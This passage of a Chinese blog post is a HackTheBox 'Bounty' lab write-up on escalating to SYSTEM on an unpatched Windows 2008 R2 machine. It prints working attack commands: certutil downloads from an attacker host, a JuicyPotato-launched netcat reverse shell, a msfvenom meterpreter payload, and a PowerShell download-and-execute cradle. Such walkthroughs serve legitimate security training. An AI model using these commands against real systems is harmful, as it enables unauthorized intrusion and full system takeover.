+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.41.13.png" alt="截屏2021-10-14 下午3.41.13"><br>成功获取第一个flag</p>
+<h2 id="0x03-权限提升-system"><a href="#0x03-权限提升-system" class="headerlink" title="0x03 权限提升[system]"></a>0x03 权限提升[system]</h2><h3 id="查询内核漏洞"><a href="#查询内核漏洞" class="headerlink" title="查询内核漏洞"></a>查询内核漏洞</h3><p>查看系统相关信息<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.43.52.png" alt="截屏2021-10-14 下午3.43.52"><br>发现目标是 Windows 2008 R2 且未安装补丁，使用 Windows-Exploit-Suggester 查找相关漏洞</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python windows-exploit-suggester.py --database 2021-05-18-mssb.xls  --systeminfo systeminfo.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%883.47.55.png" alt="截屏2021-10-14 下午3.47.55"></p>
+<h3 id="手工内核提权"><a href="#手工内核提权" class="headerlink" title="手工内核提权"></a>手工内核提权</h3><p>选择 Juicy Potato 进行提权，在本地开启nc监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure>
+<p>上传 JuicyPotato.exe 并执行反弹命令</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">certutil.exe -urlcache -f http://10.10.14.7/JuicyPotato.exe C:\WINDOWS\TEMP\JuicyPotato.exe</span><br><span class="line">certutil.exe -urlcache -f http://10.10.14.7/nc.exe C:\WINDOWS\TEMP\nc.exe</span><br><span class="line">C:\WINDOWS\TEMP\JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a <span class="string">&quot;/c C:\WINDOWS\TEMP\nc.exe -e cmd.exe 10.10.14.7 4444&quot;</span> -t *</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%884.42.01.png" alt="截屏2021-10-14 下午4.42.01"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%884.41.31.png" alt="截屏2021-10-14 下午4.41.31"><br>成功获得system权限，在管理员桌面上寻找第二个flag</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">dir c:\Users\Administrator\Desktop</span><br><span class="line"><span class="built_in">type</span> c:\Users\Administrator\Desktop\root.txt</span><br></pre></td></tr></table></figure>
+<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%884.50.01.png" alt="截屏2021-10-14 下午4.50.01"><br>成功获取第二个flag</p>
+<h3 id="MSF提权"><a href="#MSF提权" class="headerlink" title="MSF提权"></a>MSF提权</h3><p>首先使用 msfvenom 生成反弹的 powershell 代码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.7 LPORT=6666 -f psh -o ~/hackthebox/Bounty/msf.ps1</span><br></pre></td></tr></table></figure>
+<p>在本地开启 msf 监听</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">msf &gt; use exploit/multi/handler</span><br><span class="line">msf &gt; <span class="built_in">set</span> lhost 10.10.14.7</span><br><span class="line">msf &gt; <span class="built_in">set</span> lport 6666</span><br><span class="line">msf &gt; <span class="built_in">set</span> payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">msf &gt; run </span><br></pre></td></tr></table></figure>
+<p>修改 web.config 内容并上传</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iex(new-object net.webclient).downloadstring(<span class="string">&#x27;http://10.10.14.7/msf.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>
+<p>访问 web.config 后成功获取反弹的 meterpreter<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%885.00.12.png" alt="截屏2021-10-14 下午5.00.12"><br>使用 local_exploit_suggester 查询提权程序</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; background</span><br><span class="line">msf &gt; use post/multi/recon/local_exploit_suggester</span><br><span class="line">msf &gt; <span class="built_in">set</span> session 1</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<p>选择 ms10-092 进行提权并成功获得 system 权限<br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%885.33.19.png" alt="截屏2021-10-14 下午5.33.19"><br><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="/post/b9f7bac9/%E6%88%AA%E5%B1%8F2021-10-14%20%E4%B8%8B%E5%8D%885.33.43.png" alt="截屏2021-10-14 下午5.33.43"></p>
+
+
+<div class="article-footer reveal fs14"><section id="license"><div class="header"><span>License</span></div><div class="body"><p>本文采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div></section></div>
+
+</article>
+
+<div class="related-wrap reveal" id="read-next"><section class="header cap theme"><span>READ NEXT</span></section><section class="body fs14"><a id="next" href="/post/51597ee4/">HTB: Heist<span class="note">Older</span></a><div class="line"></div></section></div>
+
+
+
+
+
+
+  <div class='related-wrap md reveal' id="comments">
+    <div class='cmt-title cap theme'>
+      Join the discussion
+    </div>
+    <div class='cmt-body valine'>
+      
+
+<div id="valine_container" class="valine_thread"><svg class="loading" style="vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2709"><path d="M832 512c0-176-144-320-320-320V128c211.2 0 384 172.8 384 384h-64zM192 512c0 176 144 320 320 320v64C300.8 896 128 723.2 128 512h64z" p-id="2710"></path></svg></div>
+
+    </div>
+  </div>
+
+
+
+      
+<footer class="page-footer reveal fs12"><hr><div class="text"><p>All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</p>
+<p>This site was deployed by <a href="https://toxic80l.github.io/">@toxic80L</a> using <a target="_blank" rel="noopener" href="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1" title="v1.6.1">Stellar</a>.</p>
+</div></footer>
+
+      <div class='float-panel mobile-only blur' style='display:none'>
+  <button type='button' class='sidebar-toggle mobile' onclick='sidebar.toggle()'>
+    <svg class="icon" style="width: 1em; height: 1em;vertical-align: middle;fill: currentColor;overflow: hidden;" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="15301"><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 2.3 26.8 24.6 47.5 51.6 47.6h416.5v4z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15302"></path><path d="M566.407 808.3c26.9-0.1 49.3-20.8 51.6-47.6-1.9-27.7-23.9-49.7-51.6-51.6h-412.6c-28.2-1.4-52.6 19.5-55.5 47.6 1.9 27.7 23.9 49.7 51.6 51.6h416.5z m309.3-249.9c26.9-0.1 49.3-20.8 51.6-47.6-2.2-26.8-24.6-47.5-51.6-47.6h-721.9c-27.7-2.8-52.5 17.4-55.3 45.1-0.1 0.8-0.1 1.7-0.2 2.5 0.9 27.2 23.6 48.5 50.7 47.6H875.707z m-103.1-245.9c26.9-0.1 49.3-20.8 51.6-47.6-0.4-28.3-23.2-51.1-51.5-51.6h-618.9c-29.5-1.1-54.3 21.9-55.5 51.4v0.2c1.4 27.8 25.2 49.2 53 47.8 0.8 0 1.7-0.1 2.5-0.2h618.8z" p-id="15303"></path></svg>
+  </button>
+</div>
+
+    </div>
+  </div>
+  <div class='scripts'>
+    <script type="text/javascript">
+  stellar = {
+    // 懒加载 css https://github.com/filamentgroup/loadCSS
+    loadCSS: (href, before, media, attributes) => {
+      var doc = window.document;
+      var ss = doc.createElement("link");
+      var ref;
+      if (before) {
+        ref = before;
+      } else {
+        var refs = (doc.body || doc.getElementsByTagName("head")[0]).childNodes;
+        ref = refs[refs.length - 1];
+      }
+      var sheets = doc.styleSheets;
+      if (attributes) {
+        for (var attributeName in attributes) {
+          if (attributes.hasOwnProperty(attributeName)) {
+            ss.setAttribute(attributeName, attributes[attributeName]);
+          }
+        }
+      }
+      ss.rel = "stylesheet";
+      ss.href = href;
+      ss.media = "only x";
+      function ready(cb) {
+        if (doc.body) {
+          return cb();
+        }
+        setTimeout(function () {
+          ready(cb);
+        });
+      }
+      ready(function () {
+        ref.parentNode.insertBefore(ss, before ? ref : ref.nextSibling);
+      });
+      var onloadcssdefined = function (cb) {
+        var resolvedHref = ss.href;
+        var i = sheets.length;
+        while (i--) {
+          if (sheets[i].href === resolvedHref) {
+            return cb();
+          }
+        }
+        setTimeout(function () {
+          onloadcssdefined(cb);
+        });
+      };
+      function loadCB() {
+        if (ss.addEventListener) {
+          ss.removeEventListener("load", loadCB);
+        }
+        ss.media = media || "all";
+      }
+      if (ss.addEventListener) {
+        ss.addEventListener("load", loadCB);
+      }
+      ss.onloadcssdefined = onloadcssdefined;
+      onloadcssdefined(loadCB);
+      return ss;
+    },
+
+    // 从 butterfly 和 volantis 获得灵感
+    loadScript: (src, opt) => new Promise((resolve, reject) => {
+      var script = document.createElement('script');
+      script.src = src;
+      if (opt) {
+        for (let key of Object.keys(opt)) {
+          script[key] = opt[key]
+        }
+      } else {
+        // 默认异步，如果需要同步，第二个参数传入 {} 即可
+        script.async = true
+      }
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    }),
+
+    // https://github.com/jerryc127/hexo-theme-butterfly
+    jQuery: (fn) => {
+      if (typeof jQuery === 'undefined') {
+        stellar.loadScript(stellar.plugins.jQuery).then(fn)
+      } else {
+        fn()
+      }
+    }
+  };
+  stellar.github = 'https://github.com/xaoxuu/hexo-theme-stellar/tree/1.6.1';
+  stellar.config = {
+    date_suffix: {
+      just: 'Just',
+      min: 'minutes ago',
+      hour: 'hours ago',
+      day: 'days ago',
+      month: 'months ago',
+    },
+  };
+
+  // required plugins (only load if needs)
+  stellar.plugins = {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js',
+    sitesjs: '/js/plugins/sites.js',
+    friendsjs: '/js/plugins/friends.js',
+  };
+
+  // optional plugins
+  if ('true' == 'true') {
+    stellar.plugins.lazyload = Object.assign({"enable":true,"js":"https://cdn.jsdelivr.net/npm/vanilla-lazyload@17.3.1/dist/lazyload.min.js","transition":"blur"});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.swiper = Object.assign({"enable":true,"css":"https://unpkg.com/swiper@6/swiper-bundle.min.css","js":"https://unpkg.com/swiper@6/swiper-bundle.min.js"});
+  }
+  if ('' == 'true') {
+    stellar.plugins.scrollreveal = Object.assign({"enable":null,"js":"https://cdn.jsdelivr.net/npm/scrollreveal@4.0.9/dist/scrollreveal.min.js","distance":"8px","duration":500,"interval":100,"scale":1});
+  }
+  if ('true' == 'true') {
+    stellar.plugins.preload = Object.assign({"enable":true,"service":"flying_pages","instant_page":"https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@4.1.2/js/instant_page.js","flying_pages":"https://cdn.jsdelivr.net/gh/gijo-varghese/flying-pages@2.1.2/flying-pages.min.js"});
+  }
+</script>
+
+<!-- required -->
+
+  
+<script src="/js/main.js" async></script>
+
+
+
+<!-- optional -->
+
+  <script>
+  function getEmojiMaps() {
+    function emoji(path, idx, ext) {
+      return path + "/" + path + "-" + idx + "." + ext;
+    }
+    var emojiMaps = {};
+    for (var i = 1; i <= 54; i++) {
+      emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+    }
+    for (var i = 1; i <= 101; i++) {
+      emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+    }
+    for (var i = 1; i <= 116; i++) {
+      emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+    }
+    for (var i = 1; i <= 125; i++) {
+      emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+    }
+    for (var i = 1; i <= 4; i++) {
+      emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+    }
+    return emojiMaps;
+  }
+  function load_comment(){
+    if(!document.getElementById("valine_container"))return;
+    stellar.loadScript('https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js', {defer:true}).then(function () {
+      const el = document.getElementById("valine_container");
+      var path = el.getAttribute('comment_id');
+      const placeholder = "";
+      if (!path) {
+        path = decodeURI(window.location.pathname);
+      }
+      var valine = new Valine();
+      valine.init(Object.assign({"js":"https://cdn.jsdelivr.net/gh/XuxuGood/simple-blog-cdn@main/js/Valine.min.js","appId":"5eo9cV9bsvMnta4gOnhxtdKF-gzGzoHsz","appKey":"LwEPyca9biyGVsDzHA7WfAjH","placeholder":null,"requiredFields":["nick","mail"],"enableQQ":true,"recordIP":false,"avatar":"robohash","pageSize":10,"lang":"zh-cn","highlight":true,"mathJax":false,"tagMeta":["博主","小伙伴","访客"],"metaPlaceholder":{"nick":"昵称/QQ号(必填)","mail":"邮箱（必填，完全保密）","link":"网址(https://)"},"master":["6783037F2DF30EAB99F9FC256157D875"],"friends":["6783037F2DF30EAB99F9FC256157D875"]}, {
+        el: '#valine_container',
+        path: path,
+        placeholder: placeholder,
+        emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+        emojiMaps: getEmojiMaps(),
+      }));
+    });
+  }
+  window.addEventListener('DOMContentLoaded', (event) => {
+    console.log('DOM fully loaded and parsed');
+    load_comment();
+  });
+
+</script>
+
+
+
+
+<!-- inject -->
+
+
+  </div>
+</body>
+</html>
